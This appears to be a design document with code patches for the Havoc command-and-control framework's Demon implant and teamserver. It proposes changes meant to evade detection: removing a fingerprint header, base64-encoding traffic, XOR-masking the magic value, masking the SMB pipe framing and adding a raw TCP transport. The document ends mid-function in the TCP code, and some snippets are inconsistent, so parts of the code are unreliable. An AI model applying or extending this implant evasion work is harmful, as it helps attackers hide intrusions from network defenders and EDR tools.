# Havoc Traffic Improvement Suggestions

Reference: `NetworkAnalysis.md` (packet structure, encryption model, detection artifacts).
Reference: `Teamserver.md`, `Client.md`, `Demon.md` (component internals).

Each suggestion states the problem, affected files with exact locations, code changes required, and what other framework components must also change for the suggestion to be valid end-to-end.

---

## Table of Contents

1. [Remove the X-Havoc Response Header Leak](#1-remove-the-x-havoc-response-header-leak)
2. [Base64-Encode the HTTP Request and Response Body](#2-base64-encode-the-http-request-and-response-body)
3. [Obfuscate the Plaintext Outer Header (Mask the Magic Value)](#3-obfuscate-the-plaintext-outer-header-mask-the-magic-value)
4. [Per-Request Random IV — Stop Using a Static Incrementing Counter](#4-per-request-random-iv--stop-using-a-static-incrementing-counter)
5. [Protect the Session Key During Registration — Asymmetric Key Wrapping](#5-protect-the-session-key-during-registration--asymmetric-key-wrapping)
6. [Add HMAC-SHA256 Packet Authentication Tag](#6-add-hmac-sha256-packet-authentication-tag)
7. [Compress Payload Before Encryption](#7-compress-payload-before-encryption)
8. [SMB — Randomise the Pipe Framing Header](#8-smb--randomise-the-pipe-framing-header)
9. [Add a Raw TCP Transport](#9-add-a-raw-tcp-transport)

---

## 1. Remove the X-Havoc Response Header Leak

### Problem

The `fake404()` handler responds to any request that fails header, URI, or User-Agent validation. It sets `X-Havoc: true` on every such response. This is a teamserver fingerprint visible to any passive observer.

### Affected File

`teamserver/pkg/handlers/http.go` — lines 80–91.

### Current Code

```go
// teamserver/pkg/handlers/http.go:80-91
func (h *HTTP) fake404(ctx *gin.Context) {
    ctx.Writer.WriteHeader(http.StatusNotFound)
    html, err := os.ReadFile("teamserver/pkg/handlers/404.html")
    if err != nil {
        logger.Debug("Could not read fake 404 page: " + err.Error())
        return
    }
    ctx.Header("Server", "nginx")
    ctx.Header("Content-Type", "text/html")
    ctx.Header("X-Havoc", "true")   // ← leaks teamserver identity
    ctx.Writer.Write(html)
}
```

### Suggested Change

```go
// teamserver/pkg/handlers/http.go:80-91
func (h *HTTP) fake404(ctx *gin.Context) {
    ctx.Writer.WriteHeader(http.StatusNotFound)
    html, err := os.ReadFile("teamserver/pkg/handlers/404.html")
    if err != nil {
        logger.Debug("Could not read fake 404 page: " + err.Error())
        return
    }
    ctx.Header("Server", "nginx")
    ctx.Header("Content-Type", "text/html")
    ctx.Writer.Write(html)
}
```

### Why

`X-Havoc: true` is a static string present on every rejected request. Any IDS rule or passive network scan can enumerate Havoc listeners by sending a GET request to the listener port and checking for this header. Removing it costs nothing.

### Other Components That Must Change

None. This change is self-contained in the teamserver.

---

## 2. Base64-Encode the HTTP Request and Response Body

### Problem

All HTTP POST bodies are raw binary. This is immediately anomalous — most legitimate web traffic with POST bodies uses JSON, form-encoded data, or multipart. The raw binary body also makes the static 20-byte header trivial to match at offset 0.

### Why Base64

Base64 is universally present in legitimate web traffic (API tokens, image uploads, form data). It doubles as a lightweight obfuscation layer that breaks binary pattern matching at the wire level. The encoding overhead is ~33%, negligible compared to task data sizes.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/TransportHttp.c` | Encode body before `WinHttpSendRequest`; decode response |
| `teamserver/pkg/handlers/http.go` | Decode request body before passing to `parseAgentRequest`; encode response |

A base64 implementation must be added to the Demon (no CRT dependency — custom or existing minimal implementation in `src/core/MiniStd.c`).

### Demon Side — TransportHttp.c

The change wraps the `Send->Buffer` with base64 before `WinHttpSendRequest` and decodes `Resp->Buffer` after `WinHttpReadData`. All existing packet construction in `Package.c` stays unchanged.

```c
// payloads/Demon/src/core/TransportHttp.c
// After: BOOL HttpSend( _In_ PBUFFER Send, _Out_opt_ PBUFFER Resp )

// Before WinHttpSendRequest (line ~247):

    /* Base64-encode the packet before transmit */
    PVOID  EncodedBuf  = NULL;
    SIZE_T EncodedSize = 0;

    Base64Encode( Send->Buffer, Send->Length, &EncodedBuf, &EncodedSize );

    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, EncodedBuf, EncodedSize, EncodedSize, 0 ) ) {
```

And decode the response after reading:

```c
    /* After reading raw response into RespBuffer/RespSize, decode it */
    PVOID  DecodedBuf  = NULL;
    SIZE_T DecodedSize = 0;

    Base64Decode( RespBuffer, RespSize, &DecodedBuf, &DecodedSize );
    Instance->Win32.LocalFree( RespBuffer );

    Resp->Length = DecodedSize;
    Resp->Buffer = DecodedBuf;
```

The `Base64Encode` / `Base64Decode` functions should be added to `payloads/Demon/src/core/MiniStd.c` and declared in `payloads/Demon/include/core/MiniStd.h`. They must use only `LocalAlloc` (no CRT). A minimal RFC 4648 implementation is 60–80 lines of C.

### Teamserver Side — http.go

```go
// teamserver/pkg/handlers/http.go
// Add to imports:
import (
    "encoding/base64"
    // ... existing imports
)

// In func (h *HTTP) request(ctx *gin.Context) — after reading Body (~line 97):

    Body, err := io.ReadAll(ctx.Request.Body)
    if err != nil {
        logger.Debug("Error while reading request: " + err.Error())
    }

    // Decode base64 body from agent
    Body, err = base64.StdEncoding.DecodeString(string(Body))
    if err != nil {
        logger.Warn("failed to base64-decode agent request body")
        h.fake404(ctx)
        return
    }

// ... existing header/URI/UA validation unchanged ...

// When writing response (~line 187), encode before writing:
    if Response, Success := parseAgentRequest(h.Teamserver, Body, ExternalIP); Success {
        encoded := base64.StdEncoding.EncodeToString(Response.Bytes())
        _, err := ctx.Writer.Write([]byte(encoded))
```

### Content-Type Alignment

Set a realistic `Content-Type` header in both directions via the profile `Response.Headers` config. For example, `Content-Type: application/octet-stream` or `Content-Type: text/plain` (base64 is valid plain text). This is already profile-configurable on the response side; the Demon's request `Content-Type` header should be added via `Instance->Config.Transport.Headers`.

### Other Components That Must Change

The `external.go` handler (`handlers/external.go:40-50`) uses the same `parseAgentRequest` path. It should apply the same base64 decode/encode wrapper. The SMB transport is unaffected (named pipe, not HTTP).

---

## 3. Obfuscate the Plaintext Outer Header (Mask the Magic Value)

### Problem

The 20-byte outer header is always plaintext. `0xDEADBEEF` sits at bytes 4–7 of every POST body. This is the single most detectable element in all Demon network traffic — a one-byte IDS rule matches it.

### Approach

XOR the four header fields that follow the SIZE field (magic, agent ID, command ID, request ID — bytes 4–19) with a 16-byte mask derived from the SIZE field. This costs four XOR operations, requires no additional key material, and makes the magic value different on every packet (because SIZE varies).

The mask derivation must be deterministic from SIZE alone so the teamserver can reverse it without storing additional state. A simple approach:

```
mask[i] = (SIZE >> (i * 4)) ^ SEED
```

where `SEED` is a compile-time constant (different from `0xDEADBEEF`) embedded in both Demon and teamserver.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/Package.c` | Apply XOR mask before transmit in `PackageTransmitNow()` and `PackageTransmitAll()` |
| `teamserver/pkg/agent/agent.go` | Reverse the XOR mask in `ParseHeader()` before reading magic/agent ID |

### Demon Side — Package.c

The mask is applied after the header is fully written but before `TransportSend`. The existing code in `PackageTransmitAll()` already has a clean separation at line 377–391:

```c
// payloads/Demon/src/core/Package.c
// In PackageTransmitAll(), after Int32ToBuffer( Package->Buffer, ... ) (~line 377)
// and in PackageTransmitNow(), after Int32ToBuffer( Package->Buffer, ... ) (~line 246)

#define HEADER_MASK_SEED  0xA3F1C2B4   /* compile-time constant — match on teamserver */

    /* XOR-mask bytes 4..19 (magic, agent id, cmd id, request id) with SIZE-derived mask */
    {
        UINT32 Size   = DEREF32( Package->Buffer );   /* already written big-endian */
        PUCHAR Header = ( PUCHAR ) Package->Buffer + sizeof( UINT32 );
        UINT32 Mask   = ( Size ^ HEADER_MASK_SEED );
        UINT32 i;

        for ( i = 0; i < 4; i++ ) {
            UINT32 Word = DEREF32( Header + i * sizeof( UINT32 ) );
            Word ^= Mask;
            Int32ToBuffer( Header + i * sizeof( UINT32 ), Word );
        }
    }

    // ... then AES encrypt and TransportSend as before
```

### Teamserver Side — agent.go ParseHeader()

```go
// teamserver/pkg/agent/agent.go:181
// In ParseHeader(), after reading Header.Size and before reading Header.MagicValue

const HeaderMaskSeed uint32 = 0xA3F1C2B4   // must match Demon HEADER_MASK_SEED

func ParseHeader(data []byte) (Header, error) {
    var (
        Header = Header{}
        Parser = parser.NewParser(data)
    )

    if Parser.Length() > 4 {
        Header.Size = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse package size")
    }

    // Unmask the next 16 bytes (4 fields × 4 bytes) before parsing
    mask := uint32(Header.Size) ^ HeaderMaskSeed
    Parser.XorMaskNextBytes(mask, 16)   // helper added to parser (see below)

    if Parser.Length() > 4 {
        Header.MagicValue = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse magic value")
    }

    if Parser.Length() > 4 {
        Header.AgentID = Parser.ParseInt32()
    } else {
        return Header, errors.New("failed to parse agent id")
    }

    Header.Data = Parser
    return Header, nil
}
```

Add `XorMaskNextBytes` to `teamserver/pkg/common/parser/parser.go`:

```go
// teamserver/pkg/common/parser/parser.go
// Add after the existing ParseInt32 / ParseBytes methods

func (p *Parser) XorMaskNextBytes(mask uint32, length int) {
    if len(p.buffer) < length {
        return
    }
    maskBytes := []byte{
        byte(mask >> 24), byte(mask >> 16), byte(mask >> 8), byte(mask),
    }
    for i := 0; i < length; i++ {
        p.buffer[i] ^= maskBytes[i%4]
    }
}
```

### Why

After this change, the bytes at offset 4 are `0xDEADBEEF XOR mask(SIZE)`. Since SIZE changes with each packet, the wire representation of the magic value is different every request. No static 4-byte sequence appears at a fixed offset.

### Other Components That Must Change

- `handlers.go` calls `ParseHeader()` — no change needed there, the fix is inside `ParseHeader()`.
- `handleDemonAgent` reads `Header.MagicValue` post-unmask — works unchanged.
- SMB: the Demon writes the same header format for the pipe payload, so the same XOR mask logic in `Package.c` covers both transports.

---

## 4. Per-Request Random IV — Stop Using a Static Incrementing Counter

### Problem

The AES-256-CTR IV is a 16-byte counter that starts from the compiled-in value and increments predictably. A known-plaintext attacker who captures enough traffic can correlate the counter state to a specific agent and session age. Two agents compiled with the same IV will have identically structured keystreams until the counter diverges.

### Approach

Generate a fresh random 16-byte IV for each transmitted packet. Prepend it in plaintext to the encrypted payload. The teamserver reads the first 16 bytes as the IV for that packet. The compiled-in `Instance->Config.AES.IV` becomes the long-term key IV used only for the registration packet; all subsequent packets use per-request random IVs.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/Package.c` | Generate random IV per call in `PackageTransmitAll()` |
| `payloads/Demon/src/core/Package.c` | `PackageTransmitNow()` for registration remains unchanged (uses config IV) |
| `teamserver/pkg/handlers/handlers.go` | Read per-packet IV from first 16 bytes before `DecryptBuffer` |
| `teamserver/pkg/common/parser/parser.go` | Pass IV into `DecryptBuffer` |

### Demon Side — Package.c PackageTransmitAll()

```c
// payloads/Demon/src/core/Package.c
// In PackageTransmitAll(), replace the static AesInit call (~line 390)

    /* Generate a random per-request IV */
    UCHAR  RandIV[ AES_BLOCKLEN ] = { 0 };
    AESCTX AesCtx                 = { 0 };

    /* Use existing RandomNumber32() to fill the IV */
    for ( DWORD i = 0; i < AES_BLOCKLEN; i += sizeof( UINT32 ) ) {
        UINT32 R = RandomNumber32();
        MemCopy( RandIV + i, &R, sizeof( UINT32 ) );
    }

    /* Encrypt with the fresh IV */
    AesInit( &AesCtx, Instance->Config.AES.Key, RandIV );
    AesXCryptBuffer( &AesCtx, Package->Buffer + Padding, Package->Length - Padding );

    /* Prepend the IV in plaintext before the packet buffer */
    PVOID  WireBuffer = Instance->Win32.LocalAlloc( LPTR, AES_BLOCKLEN + Package->Length );
    MemCopy( WireBuffer,               RandIV,          AES_BLOCKLEN    );
    MemCopy( WireBuffer + AES_BLOCKLEN, Package->Buffer, Package->Length );

    if ( TransportSend( WireBuffer, AES_BLOCKLEN + Package->Length, Response, Size ) ) {
        Success = TRUE;
    }

    MemSet( WireBuffer, 0, AES_BLOCKLEN + Package->Length );
    Instance->Win32.LocalFree( WireBuffer );
```

### Teamserver Side — handlers.go handleDemonAgent()

```go
// teamserver/pkg/handlers/handlers.go
// In handleDemonAgent(), before the command parsing loop (~line 78)
// ParseHeader already consumed SIZE + MagicValue + AgentID (12 bytes).
// The remaining buffer now starts with the per-packet IV.

    // Read the per-packet IV from the front of Header.Data
    var PacketIV []byte
    if Header.Data.Length() >= 16 {
        PacketIV = Header.Data.ParseBytesOfLength(16)
    } else {
        return Response, false
    }

    // ... then when decrypting (line ~102):
    Header.Data.DecryptBufferWithIV(Agent.Encryption.AESKey, PacketIV)
```

Add `ParseBytesOfLength` and `DecryptBufferWithIV` to `teamserver/pkg/common/parser/parser.go`:

```go
// teamserver/pkg/common/parser/parser.go

func (p *Parser) ParseBytesOfLength(n int) []byte {
    if len(p.buffer) < n {
        return nil
    }
    out := p.buffer[:n]
    p.buffer = p.buffer[n:]
    return out
}

func (p *Parser) DecryptBufferWithIV(AESKey []byte, AESIv []byte) {
    p.buffer = crypt.XCryptBytesAES256(p.buffer, AESKey, AESIv)
}
```

### Why

Per-request IVs eliminate keystream reuse between requests. Even if the AES key is compromised, individual packets cannot be replayed or correlated by IV value. This is the standard approach used by TLS 1.3 and modern protocols.

### Other Components That Must Change

The registration packet (`PackageTransmitNow` with `DEMON_INITIALIZE`) continues to use `Instance->Config.AES.IV` as before — the teamserver parses it by reading the 32-byte key + 16-byte IV from the registration body, so it already has the IV needed for the registration handshake. Only post-registration packets (`PackageTransmitAll`) use per-request IVs.

---

## 5. Protect the Session Key During Registration — Asymmetric Key Wrapping

### Problem

On plain HTTP, the 32-byte AES session key and 16-byte IV are sent as cleartext at offset 20–67 of the registration packet (`DEMON_INITIALIZE`). Any passive observer captures the session key and can decrypt all subsequent traffic for that session.

Even on HTTPS this matters: if the teamserver TLS certificate is self-signed (the default) and certificate validation is disabled on the Demon side, a TLS MITM attack is trivially possible (no pinning on either side).

### Approach

Embed the teamserver's RSA-2048 (or ECDH Curve25519) **public key** into the Demon binary at payload-generation time. The Demon wraps (encrypts) the AES session key + IV using that public key before placing them in the registration packet. Only the teamserver's private key can unwrap it.

This is standard ECIES / RSA-OAEP key transport. The overall packet structure stays the same — only the 48-byte key block at offset 20 changes from plaintext to ciphertext.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/Demon.c:160-161` | Replace `PackageAddPad(Key)` + `PackageAddPad(IV)` with RSA-wrapped ciphertext |
| `payloads/Demon/src/crypt/` | Add RSA-OAEP or ECDH encrypt function |
| `teamserver/pkg/agent/agent.go` (`ParseDemonRegisterRequest`) | Unwrap the key block with the private key before storing |
| `teamserver/pkg/common/builder/` | Embed the teamserver public key into the generated Demon at build time |
| `teamserver/pkg/handlers/handlers.go` | No change — key parsing is in `ParseDemonRegisterRequest` |

### Demon Side — Demon.c DemonMetaData()

```c
// payloads/Demon/src/Demon.c:159-161
// Current:
    PackageAddPad( *MetaData, ( PCHAR ) Instance->Config.AES.Key, 32 );
    PackageAddPad( *MetaData, ( PCHAR ) Instance->Config.AES.IV,  16 );

// Replace with:
    {
        UCHAR  KeyMaterial[ 48 ] = { 0 };   /* 32 key + 16 IV */
        UCHAR  Wrapped[ 256 ]    = { 0 };   /* RSA-2048 output */
        SIZE_T WrappedLen        = 0;

        MemCopy( KeyMaterial,      Instance->Config.AES.Key, 32 );
        MemCopy( KeyMaterial + 32, Instance->Config.AES.IV,  16 );

        /* RsaOaepEncrypt wraps KeyMaterial with the embedded public key.
         * Instance->Config.Transport.ServerPublicKey is the DER-encoded RSA
         * public key embedded at generation time. */
        RsaOaepEncrypt(
            Instance->Config.Transport.ServerPublicKey,
            Instance->Config.Transport.ServerPublicKeyLen,
            KeyMaterial, 48,
            Wrapped, &WrappedLen
        );

        PackageAddPad( *MetaData, ( PCHAR ) Wrapped, WrappedLen );

        MemSet( KeyMaterial, 0, sizeof( KeyMaterial ) );
        MemSet( Wrapped,     0, sizeof( Wrapped ) );
    }
```

`RsaOaepEncrypt` can be implemented using `BCryptEncrypt` (Windows CNG) or a pure C minimal RSA library. CNG is preferred since it requires no additional code and the Demon already resolves `bcrypt.dll` indirectly via other modules.

### Teamserver Side — agent.go ParseDemonRegisterRequest()

```go
// teamserver/pkg/agent/agent.go — in ParseDemonRegisterRequest()
// Where it currently reads the raw AES key bytes, replace with RSA unwrap:

    // Read wrapped key material (256 bytes for RSA-2048)
    WrappedKey := Header.Data.ParseBytesOfLength(256)

    // Unwrap using teamserver private key
    KeyMaterial, err := rsa.DecryptOAEP(sha256.New(), rand.Reader, teamserverPrivKey, WrappedKey, nil)
    if err != nil {
        logger.Error("Failed to unwrap agent AES key: " + err.Error())
        return nil
    }

    Agent.Encryption.AESKey = KeyMaterial[:32]
    Agent.Encryption.AESIv  = KeyMaterial[32:48]
```

The teamserver private key is loaded at startup from the profile or a key file. The matching public key is embedded into the Demon at payload generation in `teamserver/pkg/common/builder/`.

### Why

After this change, passive network capture of the registration packet yields only the RSA ciphertext — useless without the teamserver private key. This closes the only remaining plaintext key transmission path.

### Other Components That Must Change

- **Builder (`teamserver/pkg/common/builder/`):** Must embed the teamserver's RSA public key (DER bytes) into the Demon config block at compile time, alongside the existing AES key/IV.
- **Client:** The payload dialog (`client/src/UserInterface/Dialogs/Payload.cc`) requires no change — key generation is handled server-side in the builder.
- The registration packet size increases from 48 bytes of key material to 256 bytes of RSA-2048 ciphertext. The `SIZE` field in the outer header adjusts automatically.

---

## 6. Add HMAC-SHA256 Packet Authentication Tag

### Problem

There is currently no packet integrity or authentication check beyond the AES-CTR encryption itself. AES-CTR is malleable — an attacker who can modify ciphertext bytes can make predictable changes to the plaintext without knowing the key (bit-flipping). There is also no replay protection.

### Approach

Append a 32-byte HMAC-SHA256 tag computed over the encrypted packet body (encrypt-then-MAC). The teamserver verifies the tag before decrypting. Invalid tags are silently dropped (fake 404 response). This is standard authenticated encryption practice.

Key used for HMAC: derive a separate MAC key from the AES session key using `HMAC-SHA256(AES_key, "mac")`.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/Package.c` | Append HMAC after encryption in `PackageTransmitAll()` |
| `payloads/Demon/src/crypt/` | Add HMAC-SHA256 function (or use `BCryptCreateHash`) |
| `teamserver/pkg/handlers/handlers.go` | Verify HMAC before `ParseHeader` |
| `teamserver/pkg/common/crypt/aes.go` | Add `HmacSHA256` helper |

### Demon Side — Package.c PackageTransmitAll()

```c
// payloads/Demon/src/core/Package.c
// After AesXCryptBuffer() and before TransportSend() in PackageTransmitAll()

    #define HMAC_SIZE 32

    UCHAR MacKey[ HMAC_SIZE ] = { 0 };
    UCHAR Tag[ HMAC_SIZE ]    = { 0 };

    /* Derive MAC key: HMAC-SHA256( AES_key, "mac\0" ) */
    HmacSha256( Instance->Config.AES.Key, 32,
                (PUCHAR)"mac", 3,
                MacKey );

    /* MAC covers everything from SIZE field to end of encrypted payload */
    HmacSha256( MacKey, HMAC_SIZE,
                Package->Buffer, Package->Length,
                Tag );

    /* Append tag to wire buffer */
    PVOID  WireBuffer = Instance->Win32.LocalAlloc( LPTR, Package->Length + HMAC_SIZE );
    MemCopy( WireBuffer,                 Package->Buffer, Package->Length );
    MemCopy( WireBuffer + Package->Length, Tag,           HMAC_SIZE       );

    if ( TransportSend( WireBuffer, Package->Length + HMAC_SIZE, Response, Size ) ) {
        Success = TRUE;
    }

    MemSet( MacKey, 0, HMAC_SIZE );
    MemSet( Tag,    0, HMAC_SIZE );
    Instance->Win32.LocalFree( WireBuffer );
```

`HmacSha256` can be implemented using `BCryptCreateHash` with `BCRYPT_SHA256_ALGORITHM` in HMAC mode, or a compact pure-C HMAC-SHA256 (~150 lines). Place in `payloads/Demon/src/crypt/HmacSha256.c`.

### Teamserver Side — handlers.go

```go
// teamserver/pkg/handlers/handlers.go
// In parseAgentRequest(), before calling ParseHeader

import (
    "crypto/hmac"
    "crypto/sha256"
)

func parseAgentRequest(Teamserver agent.TeamServer, Body []byte, ExternalIP string) (bytes.Buffer, bool) {
    const HmacSize = 32

    // For registration packets (agent not yet known), defer HMAC check to after key extraction.
    // For known agents, verify HMAC before doing anything else.

    if len(Body) < 12 + HmacSize {
        return Response, false
    }

    // Split body and tag
    payload := Body[:len(Body)-HmacSize]
    tag     := Body[len(Body)-HmacSize:]

    // Parse header to get AgentID and look up session key
    Header, err := agent.ParseHeader(payload)
    if err != nil || Header.Data.Length() < 4 {
        return Response, false
    }

    if Header.MagicValue == agent.DEMON_MAGIC_VALUE {
        if Teamserver.AgentExist(Header.AgentID) {
            a := Teamserver.AgentInstance(Header.AgentID)
            macKey := crypt.HmacSHA256(a.Encryption.AESKey, []byte("mac"))
            expected := crypt.HmacSHA256(macKey, payload)
            if !hmac.Equal(expected, tag) {
                logger.Warn("HMAC verification failed — dropping packet")
                return Response, false
            }
        }
        // Registration packets: HMAC not verified (key not yet known)
        return handleDemonAgent(Teamserver, Header, ExternalIP)
    }

    return handleServiceAgent(Teamserver, Header, ExternalIP)
}
```

Add to `teamserver/pkg/common/crypt/aes.go`:

```go
// teamserver/pkg/common/crypt/aes.go

import (
    "crypto/hmac"
    "crypto/sha256"
)

func HmacSHA256(key []byte, data []byte) []byte {
    mac := hmac.New(sha256.New, key)
    mac.Write(data)
    return mac.Sum(nil)
}
```

### Why

Prevents ciphertext bit-flipping attacks against AES-CTR. Stops replay of captured packets (a timestamp or sequence number in the HMAC input would additionally address replay — combine with suggestion 4). Forces an attacker to know the session key to produce valid packets.

### Other Components That Must Change

The HMAC size (32 bytes) increases the wire size of every packet. The `SIZE` field in the outer header already excludes itself — no structural changes needed. The Client and external service agents are unaffected.

---

## 7. Compress Payload Before Encryption

### Problem

Large task results (file transfers, process listings, screenshots) sent as-is can cause high-entropy binary blobs of predictable size patterns. Compression reduces payload size and, when combined with encryption, improves entropy uniformity (though encryption already produces high entropy, compression reduces the amount of data to transmit).

### Approach

Apply a lightweight compression algorithm to the payload body **before** AES encryption. The result is smaller ciphertext with no loss of data. Use `RtlDecompressBuffer` / `RtlCompressBuffer` (already available via `ntdll.dll`) with `COMPRESSION_FORMAT_LZNT1` — no additional DLL required.

On the teamserver side, decompress after decryption.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/Package.c` | Compress payload in `PackageTransmitAll()` before `AesXCryptBuffer` |
| `payloads/Demon/include/Demon.h` | Add `RtlCompressBuffer` / `RtlDecompressBuffer` to `WIN32_FUNC` table |
| `teamserver/pkg/common/crypt/` | Add `DecompressLZNT1` using Go `compress/flate` or equivalent |
| `teamserver/pkg/handlers/handlers.go` | Decompress `Header.Data` buffer after AES decryption |

### Demon Side — Package.c

```c
// payloads/Demon/src/core/Package.c
// In PackageTransmitAll(), replace the direct AES call at ~line 390

    PVOID  CompressedBuf  = NULL;
    ULONG  CompressedSize = 0;
    ULONG  WorkspaceSize  = 0;
    ULONG  FragWorkSize   = 0;
    PVOID  Workspace      = NULL;
    PUCHAR EncryptStart   = Package->Buffer + Padding;
    SIZE_T EncryptLen     = Package->Length - Padding;

    /* Query workspace size required by RtlCompressBuffer */
    if ( NT_SUCCESS( Instance->Win32.RtlGetCompressionWorkSpaceSize(
            COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
            &WorkspaceSize, &FragWorkSize ) ) )
    {
        Workspace     = Instance->Win32.LocalAlloc( LPTR, WorkspaceSize );
        CompressedBuf = Instance->Win32.LocalAlloc( LPTR, EncryptLen + 256 );

        if ( NT_SUCCESS( Instance->Win32.RtlCompressBuffer(
                COMPRESSION_FORMAT_LZNT1 | COMPRESSION_ENGINE_STANDARD,
                EncryptStart, EncryptLen,
                CompressedBuf, EncryptLen + 256,
                4096,
                &CompressedSize,
                Workspace ) ) )
        {
            /* Rebuild wire buffer: header + compressed + encrypted body */
            PVOID NewBuf = Instance->Win32.LocalAlloc( LPTR, Padding + CompressedSize );
            MemCopy( NewBuf, Package->Buffer, Padding );         /* copy plaintext header */
            MemCopy( NewBuf + Padding, CompressedBuf, CompressedSize );

            /* Encrypt the compressed region */
            AesInit( &AesCtx, Instance->Config.AES.Key, RandIV );  /* use per-request IV from §4 */
            AesXCryptBuffer( &AesCtx, NewBuf + Padding, CompressedSize );

            TransportSend( NewBuf, Padding + CompressedSize, Response, Size );
            Instance->Win32.LocalFree( NewBuf );
        }

        Instance->Win32.LocalFree( Workspace );
        Instance->Win32.LocalFree( CompressedBuf );
    }
```

Add `RtlCompressBuffer`, `RtlDecompressBuffer`, `RtlGetCompressionWorkSpaceSize` to `payloads/Demon/include/Demon.h` in the `WIN32` struct and resolve them in `Win32.c` via `GetProcAddress("ntdll.dll")`.

### Teamserver Side — handlers.go

```go
// teamserver/pkg/handlers/handlers.go
// After DecryptBufferWithIV() in handleDemonAgent(), decompress the plaintext

import "compress/lzw"  // or a custom LZNT1 decoder

// After decryption:
    decompressed, err := DecompressLZNT1(Header.Data.Buffer())
    if err != nil {
        logger.Debug("Decompression failed: " + err.Error())
        return Response, false
    }
    Header.Data = parser.NewParser(decompressed)
```

A Go LZNT1 decoder is small (~100 lines). Alternatively, compress with DEFLATE on the Demon side (using a compact C implementation) and decompress with `compress/flate` on the Go side — standard library, no additional dependencies.

### Why

For large data transfers (upload/download, screenshot, process list) compression reduces the POST body size by 40–70%, reducing the time window in which the agent is making network requests. The combination of compression + encryption also makes traffic size analysis harder.

### Other Components That Must Change

Add a `Compressed` flag to the `PACKAGE` struct so that small packets are not compressed (compression overhead exceeds benefit below ~256 bytes). The teamserver must read this flag (e.g., a bit in the existing `CommandID` field's high byte, or a dedicated byte after the header) to know whether to decompress.

---

## 8. SMB — Randomise the Pipe Framing Header

### Problem

The SMB pipe framing header prepends `[DEMON_ID (4 bytes)][PKG_SIZE (4 bytes)]` to every pipe message. The `DEMON_ID` value is the same for every message from the same agent and is identical to the `AGENT ID` field in the Havoc HTTP header. If the pipe name is not randomised or if a defender can read named pipe traffic, the fixed framing is a fingerprint.

### Pipe Name

The pipe name (`Instance->Config.Transport.Name`) is already configurable via the profile. However, verify the profile defaults do not use an obvious value like `\\.\pipe\havoc`. Set a UUID-style name in the profile:

```
# profiles/havoc.yaotl
Demon {
    ...
    SMB {
        PipeName = "\\\\%s\\pipe\\%s"   # use hostname + random UUID at generation
    }
}
```

The builder (`teamserver/pkg/common/builder/`) should substitute a random UUID for the pipe name at payload-generation time.

### Framing Obfuscation — TransportSmb.c

The current `SmbRecv()` reads `[DEMON_ID][PKG_SIZE]` as plain `UINT32` values. XOR them with a session-derived mask (same `HEADER_MASK_SEED` approach from suggestion 3):

```c
// payloads/Demon/src/core/TransportSmb.c
// In SmbSend(), before PipeWrite — mask the DemonID in the framing header

// Current: the pipe write sends the raw Demon packet starting with
// [SIZE][MAGIC][AGENTID][...]. No explicit framing header in SmbSend —
// PipeWrite writes Send->Buffer directly.

// In SmbRecv() (~line 75), the reader expects [DemonId][PackageSize][payload].
// This is written by the parent Demon before forwarding the child packet.
// Locate where the parent writes the framing in Command.c / Pivot.c and
// XOR the DemonId and PackageSize fields:

    UINT32 MaskedID   = DemonId   ^ HEADER_MASK_SEED;
    UINT32 MaskedSize = PkgSize   ^ ( HEADER_MASK_SEED >> 8 );

    // write MaskedID and MaskedSize to pipe instead of raw values

// In SmbRecv, unmask after reading:
    DemonId     ^= HEADER_MASK_SEED;
    PackageSize ^= ( HEADER_MASK_SEED >> 8 );
```

The `HEADER_MASK_SEED` constant must be the same compile-time value used in suggestion 3.

### Why

Masks the fixed `DEMON_ID` value from appearing in plain form in the named pipe stream. Since named pipes are accessible to local processes and can be intercepted by EDR drivers, removing static identifiers from the pipe stream reduces forensic artifacts.

### Other Components That Must Change

The parent Demon's pivot code in `payloads/Demon/src/core/Pivot.c` (where it writes to the child pipe) must apply the same mask when writing. The teamserver's `agents/demons.go` pivot parsing code must unmask. Both sides use the same compile-time constant.

---

## 9. Add a Raw TCP Transport

### Problem

HTTP/HTTPS requires IIS/Apache-style listener infrastructure and produces HTTP traffic that may be anomalous if the targeted environment restricts or inspects web traffic. A raw TCP transport would allow communication over arbitrary TCP ports without HTTP framing overhead, useful when HTTP is blocked but arbitrary TCP outbound is not.

### Approach

Add `TRANSPORT_TCP` alongside the existing `TRANSPORT_HTTP` and `TRANSPORT_SMB` defines. A raw TCP socket sends the same binary packet format (suggestion 3 header masking + suggestion 4 per-request IV applied identically) without any HTTP wrapper.

### Affected Files

| File | Change |
|------|--------|
| `payloads/Demon/src/core/` | New file `TransportTcp.c` |
| `payloads/Demon/include/core/` | New file `TransportTcp.h` |
| `payloads/Demon/src/core/Transport.c` | Add `#ifdef TRANSPORT_TCP` branch |
| `teamserver/pkg/handlers/` | New file `tcp.go` |
| `teamserver/pkg/handlers/types.go` | Add `TCP` struct and `LISTENER_TCP` constant |
| `teamserver/pkg/common/builder/` | Add `TRANSPORT_TCP` build flag |
| `cmd/server/listener.go` | Register TCP listener startup |

### Demon Side — TransportTcp.c

```c
// payloads/Demon/src/core/TransportTcp.c (new file)
#include <Demon.h>
#include <core/TransportTcp.h>
#include <core/MiniStd.h>

#ifdef TRANSPORT_TCP

BOOL TcpSend(
    _In_      PBUFFER Send,
    _Out_opt_ PBUFFER Resp
) {
    SOCKET  Sock        = INVALID_SOCKET;
    WSADATA WsaData     = { 0 };
    struct  sockaddr_in Addr = { 0 };
    BOOL    Success     = FALSE;
    DWORD   TotalSent   = 0;
    DWORD   BytesSent   = 0;
    DWORD   BytesRecv   = 0;
    DWORD   RespSize    = 0;
    PVOID   RespBuf     = NULL;

    Instance->Win32.WSAStartup( MAKEWORD(2,2), &WsaData );

    Sock = Instance->Win32.WSASocketW( AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0 );
    if ( Sock == INVALID_SOCKET )
        goto LEAVE;

    Addr.sin_family      = AF_INET;
    Addr.sin_port        = Instance->Win32.htons( (USHORT) Instance->Config.Transport.Host->Port );
